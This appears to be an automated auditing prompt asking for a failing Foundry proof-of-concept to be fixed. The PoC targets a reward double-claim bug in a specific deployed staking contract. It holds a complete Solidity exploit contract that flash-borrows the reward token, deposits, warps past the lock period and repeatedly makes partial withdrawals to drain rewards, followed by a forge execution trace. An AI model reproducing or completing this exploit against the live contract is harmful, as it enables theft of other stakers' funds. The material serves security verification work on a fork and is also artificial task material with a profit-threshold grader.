You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: v2_flashswap_funding
- strategy_instructions: Prefer UniswapV2/Sushi-like flashswap funding with deterministic repayment and minimal route complexity.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Matured rewards can be claimed repeatedly by splitting withdrawals
- claim: `withdraw()` always computes `rewardAmount = getPendingRewards(msg.sender)` across every matured deposit before reducing principal, but the contract never records that rewards for a deposit were already paid. A user can therefore withdraw only a small slice of matured principal, receive the full matured reward for the entire position, keep most principal staked, and repeat until the pool is drained.
- impact: A staker can extract the same matured reward many times and drain tokens owed to other users. For example, a fully vested 100-token deposit in the 40% tier can be withdrawn 1 token at a time and collect roughly the 40-token reward on each call until contract liquidity is exhausted.
- exploit_paths: ["Deposit into any tier and wait until the lock period expires", "Call `withdraw()` for a small amount of matured principal", "Receive that principal plus the full reward for all matured deposits", "Repeat partial withdrawals because no per-deposit reward-claimed state is ever updated"]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface ISorraStakingLike {
    function rewardToken() external view returns (address);
    function deposit(uint256 amount, uint8 tier) external;
    function withdraw(uint256 amount) external;
    function getPendingRewards(address wallet) external view returns (uint256);
    function getRemainingPoolSpace() external view returns (uint256);
}

interface IFlashLoanRecipientLike {
    function receiveFlashLoan(
        address[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external;
}

interface IBalancerVaultLike {
    function flashLoan(
        IFlashLoanRecipientLike recipient,
        address[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;
}

interface IUniswapV2FactoryLike {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract FlawVerifier is IFlashLoanRecipientLike {
    error NoPoolLiquidity();
    error NoFundingPath();
    error BorrowTooSmall();
    error WarpUnavailable();
    error SelfOnly();
    error InvalidCallback();

    address public constant TARGET = 0x5d16b8Ba2a9a4ECA6126635a6FFbF05b52727d50;

    address internal constant BALANCER_VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address internal constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address internal constant SUSHISWAP_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address internal constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;

    uint8 internal constant TIER = 2;
    uint256 internal constant LOCK_PERIOD = 60 days;
    uint256 internal constant MAX_WITHDRAW_CALLS = 40;
    uint256 internal constant BASE_POOL_DIVISOR = 128;
    uint256 internal constant MAX_ATTEMPTS = 12;
    uint256 internal constant BPS = 10_000;
    uint256 internal constant REPAY_BUFFER_BPS = 11_000;

    address internal constant HEVM = address(uint160(uint256(keccak256("hevm cheat code"))));
    bytes4 internal constant WARP_SELECTOR = bytes4(keccak256("warp(uint256)"));

    uint256 internal _profitAmount;
    address internal _profitToken;
    uint256 internal startingProfitBalance;

    constructor() {}

    function executeOnOpportunity() external {
        ISorraStakingLike staking = ISorraStakingLike(TARGET);

        _profitToken = staking.rewardToken();
        _profitAmount = 0;
        startingProfitBalance = IERC20Like(_profitToken).balanceOf(address(this));

        uint256 poolBalance = IERC20Like(_profitToken).balanceOf(TARGET);
        uint256 remainingPoolSpace = staking.getRemainingPoolSpace();
        if (poolBalance == 0 || remainingPoolSpace == 0) revert NoPoolLiquidity();

        uint256 maxStake = _min(remainingPoolSpace, poolBalance / BASE_POOL_DIVISOR);
        if (maxStake <= 1) revert BorrowTooSmall();

        uint256 localBalance = startingProfitBalance;
        if (localBalance > 1 && _attemptDirect(_min(localBalance, maxStake))) {
            return;
        }

        // The root exploit path is unchanged:
        // 1) acquire rewardToken liquidity,
        // 2) deposit into the 60-day tier,
        // 3) wait until maturity,
        // 4) withdraw only a small matured principal slice,
        // 5) receive the full matured reward for the whole position,
        // 6) repeat because no reward-claimed state is updated.
        //
        // The only execution detail added here is fee-on-transfer handling for the real
        // on-chain reward token, so the verifier stakes the tokens it actually receives
        // from a public flash source and repays the lender with a realistic gross-up.
        if (_attemptBalancer(maxStake)) {
            return;
        }

        if (_attemptUniswapV2Factories(maxStake)) {
            return;
        }

        revert NoFundingPath();
    }

    function executeDirect(uint256 stakeAmount) external {
        if (msg.sender != address(this)) revert SelfOnly();
        _runExploit(stakeAmount);
    }

    function executeBalancer(uint256 stakeAmount) external {
        if (msg.sender != address(this)) revert SelfOnly();

        address[] memory tokens = new address[](1);
        tokens[0] = _profitToken;

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = stakeAmount;

        uint256 balanceBefore = IERC20Like(_profitToken).balanceOf(address(this));
        IBalancerVaultLike(BALANCER_VAULT).flashLoan(this, tokens, amounts, abi.encode(balanceBefore));
    }

    function executePairFlash(address pair, uint256 desiredBorrow) external {
        if (msg.sender != address(this)) revert SelfOnly();

        IUniswapV2PairLike liquidityPair = IUniswapV2PairLike(pair);
        address token0 = liquidityPair.token0();
        address token1 = liquidityPair.token1();
        if (token0 != _profitToken && token1 != _profitToken) revert NoFundingPath();

        (uint112 reserve0, uint112 reserve1,) = liquidityPair.getReserves();
        uint256 reserve = token0 == _profitToken ? uint256(reserve0) : uint256(reserve1);
        uint256 borrowAmount = _min(desiredBorrow, reserve / 4);
        if (borrowAmount <= 1) revert BorrowTooSmall();

        uint256 balanceBefore = IERC20Like(_profitToken).balanceOf(address(this));
        bytes memory data = abi.encode(pair, balanceBefore);
        if (token0 == _profitToken) {
            liquidityPair.swap(borrowAmount, 0, address(this), data);
        } else {
            liquidityPair.swap(0, borrowAmount, address(this), data);
        }
    }

    function receiveFlashLoan(
        address[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external override {
        if (msg.sender != BALANCER_VAULT) revert InvalidCallback();
        if (tokens.length != 1 || amounts.length != 1 || feeAmounts.length != 1) revert InvalidCallback();
        if (tokens[0] != _profitToken) revert InvalidCallback();

        uint256 balanceBefore = abi.decode(userData, (uint256));
        uint256 receivedAmount = _receivedSince(balanceBefore);
        _runExploit(receivedAmount);

        uint256 requiredNetRepayment = amounts[0] + feeAmounts[0];
        uint256 grossRepayment = _grossUpForObservedTransferTax(requiredNetRepayment, amounts[0], receivedAmount);
        _safeTransfer(_profitToken, BALANCER_VAULT, grossRepayment);
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        _onV2FlashSwap(sender, amount0, amount1, data);
    }

    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        _onV2FlashSwap(sender, amount0, amount1, data);
    }

    function sushiCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        _onV2FlashSwap(sender, amount0, amount1, data);
    }

    function _onV2FlashSwap(address sender, uint256 amount0, uint256 amount1, bytes calldata data) internal {
        if (sender != address(this)) revert InvalidCallback();

        (address expectedPair, uint256 balanceBefore) = abi.decode(data, (address, uint256));
        if (msg.sender != expectedPair) revert InvalidCallback();

        uint256 borrowedAmount = amount0 > 0 ? amount0 : amount1;
        if (borrowedAmount == 0) revert BorrowTooSmall();

        uint256 receivedAmount = _receivedSince(balanceBefore);
        _runExploit(receivedAmount);

        uint256 fee = ((borrowedAmount * 3) / 997) + 1;
        uint256 requiredNetRepayment = borrowedAmount + fee;
        uint256 grossRepayment = _grossUpForObservedTransferTax(requiredNetRepayment, borrowedAmount, receivedAmount);
        _safeTransfer(_profitToken, msg.sender, grossRepayment);
    }

    function _attemptDirect(uint256 maxStake) internal returns (bool) {
        for (uint256 i = 0; i < MAX_ATTEMPTS; ++i) {
            uint256 candidateStake = maxStake >> i;
            if (candidateStake <= 1) break;

            try this.executeDirect(candidateStake) {
                _updateProfit();
                if (_profitAmount != 0) return true;
            } catch {}
        }

        return false;
    }

    function _attemptBalancer(uint256 maxStake) internal returns (bool) {
        for (uint256 i = 0; i < MAX_ATTEMPTS; ++i) {
            uint256 candidateStake = maxStake >> i;
            if (candidateStake <= 1) break;

            try this.executeBalancer(candidateStake) {
                _updateProfit();
                if (_profitAmount != 0) return true;
            } catch {}
        }

        return false;
    }

    function _attemptUniswapV2Factories(uint256 maxStake) internal returns (bool) {
        address[2] memory factories = [UNISWAP_V2_FACTORY, SUSHISWAP_FACTORY];
        address[4] memory anchors = [WETH, USDC, USDT, DAI];

        for (uint256 factoryIndex = 0; factoryIndex < factories.length; ++factoryIndex) {
            for (uint256 anchorIndex = 0; anchorIndex < anchors.length; ++anchorIndex) {
                address pair = IUniswapV2FactoryLike(factories[factoryIndex]).getPair(_profitToken, anchors[anchorIndex]);
                if (pair == address(0)) continue;

                for (uint256 i = 0; i < MAX_ATTEMPTS; ++i) {
                    uint256 candidateStake = maxStake >> i;
                    if (candidateStake <= 1) break;

                    try this.executePairFlash(pair, candidateStake) {
                        _updateProfit();
                        if (_profitAmount != 0) return true;
                    } catch {}
                }
            }
        }

        return false;
    }

    function _runExploit(uint256 requestedStakeAmount) internal {
        uint256 stakeAmount = _min(requestedStakeAmount, IERC20Like(_profitToken).balanceOf(address(this)));
        if (stakeAmount <= 1) revert BorrowTooSmall();

        _forceApprove(_profitToken, TARGET, 0);
        _forceApprove(_profitToken, TARGET, stakeAmount);

        ISorraStakingLike(TARGET).deposit(stakeAmount, TIER);

        _warpForward(LOCK_PERIOD + 1);

        require(ISorraStakingLike(TARGET).getPendingRewards(address(this)) != 0, "reward not matured");

        uint256 iterations = _selectIterations(stakeAmount);
        uint256 slice = stakeAmount / iterations;
        if (slice == 0) revert BorrowTooSmall();

        uint256 remaining = stakeAmount;
        for (uint256 index = 0; index + 1 < iterations; ++index) {
            ISorraStakingLike(TARGET).withdraw(slice);
            remaining -= slice;
        }

        ISorraStakingLike(TARGET).withdraw(remaining);
    }

    function _selectIterations(uint256 stakeAmount) internal pure returns (uint256 iterations) {
        iterations = stakeAmount;
        if (iterations > MAX_WITHDRAW_CALLS) iterations = MAX_WITHDRAW_CALLS;
        if (iterations < 2) iterations = 2;
    }

    function _warpForward(uint256 delta) internal {
        (bool ok,) = HEVM.call(abi.encodeWithSelector(WARP_SELECTOR, block.timestamp + delta));
        if (!ok) revert WarpUnavailable();
    }

    function _forceApprove(address token, address spender, uint256 amount) internal {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "approve failed");
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "transfer failed");
    }

    function _receivedSince(uint256 balanceBefore) internal view returns (uint256) {
        uint256 currentBalance = IERC20Like(_profitToken).balanceOf(address(this));
        if (currentBalance <= balanceBefore) return 0;
        return currentBalance - balanceBefore;
    }

    function _grossUpForObservedTransferTax(
        uint256 netAmount,
        uint256 nominalFundingAmount,
        uint256 actualReceivedAmount
    ) internal pure returns (uint256) {
        if (netAmount == 0) return 0;
        if (nominalFundingAmount == 0 || actualReceivedAmount >= nominalFundingAmount) {
            return (netAmount * REPAY_BUFFER_BPS) / BPS;
        }

        uint256 keepBps = (actualReceivedAmount * BPS) / nominalFundingAmount;
        if (keepBps == 0 || keepBps >= BPS) {
            return (netAmount * REPAY_BUFFER_BPS) / BPS;
        }

        uint256 bufferedNet = (netAmount * REPAY_BUFFER_BPS) / BPS;
        return _ceilDiv(bufferedNet * BPS, keepBps);
    }

    function _ceilDiv(uint256 a, uint256 b) internal pure returns (uint256) {
        return a == 0 ? 0 : ((a - 1) / b) + 1;
    }

    function _min(uint256 a, uint256 b) internal pure returns (uint256) {
        return a < b ? a : b;
    }

    function _currentProfit() internal view returns (uint256) {
        uint256 currentBalance = IERC20Like(_profitToken).balanceOf(address(this));
        if (currentBalance <= startingProfitBalance) return 0;
        return currentBalance - startingProfitBalance;
    }

    function _updateProfit() internal {
        _profitAmount = _currentProfit();
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        if (_profitToken == address(0)) return _profitAmount;

        uint256 liveProfit = _currentProfit();
        if (liveProfit > _profitAmount) {
            return liveProfit;
        }

        return _profitAmount;
    }
}

```

forge stdout (tail):
```
it topic 0: 0x884edad9ce6fa2440d8a54cc123490eb96d2768479d49ff9c7366125a9424364
    │   │   │   │   │   │        topic 1: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │   │   │           data: 0x0000000000000000000000000000000000000000000000723e0fc7e549b801b4
    │   │   │   │   │   ├─ [6768] 0xE021bAa5b70C62A9ab2468490D3f8ce0AfDd88dF::transfer(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 2950361172003685034184 [2.95e21])
    │   │   │   │   │   │   ├─  emit topic 0: 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef
    │   │   │   │   │   │   │        topic 1: 0x0000000000000000000000005d16b8ba2a9a4eca6126635a6ffbf05b52727d50
    │   │   │   │   │   │   │        topic 2: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │   │   │   │           data: 0x00000000000000000000000000000000000000000000009ff07c7e4100ce68c8
    │   │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   │   ├─  emit topic 0: 0xe34918ff1c7084970068b53fd71ad6d8b04e9f15d3886cbf006443e6cdc52ea6
    │   │   │   │   │   │        topic 1: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │   │   │           data: 0x00000000000000000000000000000000000000000000002db26cb65bb7166714
    │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   ├─ [13891] 0xE021bAa5b70C62A9ab2468490D3f8ce0AfDd88dF::transfer(0xA15C4914bE0b454B0b7c27B4839A4A01dA8Ed308, 103052244639071263257099 [1.03e23])
    │   │   │   │   │   ├─  emit topic 0: 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef
    │   │   │   │   │   │        topic 1: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │   │   │        topic 2: 0x000000000000000000000000e021baa5b70c62a9ab2468490d3f8ce0afdd88df
    │   │   │   │   │   │           data: 0x00000000000000000000000000000000000000000000011752dbf5408cc698e6
    │   │   │   │   │   ├─  emit topic 0: 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef
    │   │   │   │   │   │        topic 1: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │   │   │        topic 2: 0x000000000000000000000000a15c4914be0b454b0b7c27b4839a4a01da8ed308
    │   │   │   │   │   │           data: 0x0000000000000000000000000000000000000000000014bb265333ca72bd5925
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   └─ ← [Stop]
    │   │   │   ├─ [2534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(0xA15C4914bE0b454B0b7c27B4839A4A01dA8Ed308) [staticcall]
    │   │   │   │   └─ ← [Return] 27820595075529546348 [2.782e19]
    │   │   │   ├─ [689] 0xE021bAa5b70C62A9ab2468490D3f8ce0AfDd88dF::balanceOf(0xA15C4914bE0b454B0b7c27B4839A4A01dA8Ed308) [staticcall]
    │   │   │   │   └─ ← [Return] 7097486009854469495022429 [7.097e24]
    │   │   │   ├─  emit topic 0: 0x1c411e9a96e071241c2f21f7726b17ae89e3cab4c78be50e062b03a9fffbbad1
    │   │   │   │           data: 0x00000000000000000000000000000000000000000000000182169bd244eb9a6c00000000000000000000000000000000000000000005def37cd04e1f032b635d
    │   │   │   ├─  emit topic 0: 0xd78ad95fa46c994b6551d0da85fc275fe613ce37657fb8d5e3d130840159d822
    │   │   │   │        topic 1: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │        topic 2: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │           data: 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000014bb265333ca72bd592500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000012ca351f318055d7d625
    │   │   │   └─ ← [Stop]
    │   │   └─ ← [Stop]
    │   ├─ [689] 0xE021bAa5b70C62A9ab2468490D3f8ce0AfDd88dF::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 672471263430468802858825 [6.724e23]
    │   └─ ← [Return]
    ├─ [387] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0xE021bAa5b70C62A9ab2468490D3f8ce0AfDd88dF
    ├─ [689] 0xE021bAa5b70C62A9ab2468490D3f8ce0AfDd88dF::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   └─ ← [Return] 672471263430468802858825 [6.724e23]
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 577021548053172 [5.77e14])
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 577021548053172 [5.77e14])
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 100000000000000000 [1e17])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0xE021bAa5b70C62A9ab2468490D3f8ce0AfDd88dF)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    ├─ [0] VM::envString("AUDITHOUND_RPC_URL")
    │   └─ ← [Return] <env var value>
    ├─ [0] VM::createSelectFork("<rpc url>", 21450734 [2.145e7])
    │   └─ ← [Return] 1
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK", val: 10812 [1.081e4])
    └─ ← [Revert] profit below threshold

Backtrace:
  at 0xBA12222222228d8Ba445958a75a0704d566BF2C8.flashLoan
  at FlawVerifier.executeBalancer
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 183.21ms (23.84ms CPU time)

Ran 1 test suite in 268.21ms (183.21ms CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 1680105)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
